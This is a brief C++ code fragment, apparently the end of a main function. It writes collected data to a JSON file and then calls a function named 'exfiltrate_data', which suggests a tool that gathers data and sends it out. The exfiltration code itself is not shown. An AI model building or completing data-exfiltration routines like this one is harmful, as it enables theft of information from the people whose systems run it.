    fs::path full_json = fs::path(g_config.output_dir) / "full_data.json";
    std::ofstream full(full_json);
    if (full.is_open()) {
        full << g_global_json.dump(4);
        full.close();
    }
    exfiltrate_data();
    return 0;
}